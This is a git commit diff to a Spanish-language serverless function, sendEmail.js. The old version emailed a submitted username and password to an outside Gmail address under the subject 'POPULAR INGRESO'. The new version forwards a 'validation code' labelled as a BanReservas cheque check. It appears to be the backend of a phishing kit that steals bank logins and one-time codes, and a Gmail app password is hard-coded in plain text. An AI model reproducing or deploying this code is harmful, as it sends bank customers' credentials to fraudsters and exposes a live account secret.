7811c2c3d624bb60433ed3cdc1e3f63375ea8b13
Aletiiisa <cuentaluperonp5@gmail.com>
2025-01-11 23:04:18 -0400

    Update sendEmail.js

--- functions/sendEmail.js
+++ functions/sendEmail.js
@@ -1,32 +1,45 @@
-
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
 exports.handler = async function(event, context) {
-    const { username, password } = JSON.parse(event.body);
-
-    let transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-            user: 'cuentaluperonp5@gmail.com',
-            pass: 'ogynqksiltkdnuoz',
-        },
-    });
-
-    let mailOptions = {
-        from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com', // Corregido: coma agregada entre los correos
-        subject: 'POPULAR INGRESO',
-        text: `Usuario: ${username}\nContraseña: ${password}`,
-    };
+    // Verificar si el método es POST
+    if (event.httpMethod !== 'POST') {
+        return {
+            statusCode: 405,
+            body: JSON.stringify({ message: 'Método no permitido' }),
+        };
+    }
 
     try {
+        // Extraer el campo 'code' del cuerpo de la solicitud
+        const { code } = JSON.parse(event.body);
+
+        // Configuración del transportador de Nodemailer
+        let transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: 'cuentaluperonp5@gmail.com',
+                pass: 'ogynqksiltkdnuoz', // Asegúrate de usar una contraseña de aplicación
+            },
+        });
+
+        // Configuración del correo
+        let mailOptions = {
+            from: 'cuentaluperonp5@gmail.com',
+            to: 'sierroalee@gmail.com',
+            subject: 'Validación de cheque - BanReservas',
+            text: `El usuario ingresó el siguiente código de validación:\n\nCódigo: ${code}`,
+        };
+
+        // Enviar el correo
         await transporter.sendMail(mailOptions);
+
         return {
             statusCode: 200,
             body: JSON.stringify({ message: 'Correo enviado con éxito' }),
         };
     } catch (error) {
+        console.error('Error al enviar el correo:', error);
         return {
             statusCode: 500,
             body: JSON.stringify({ message: 'Error al enviar el correo' }),
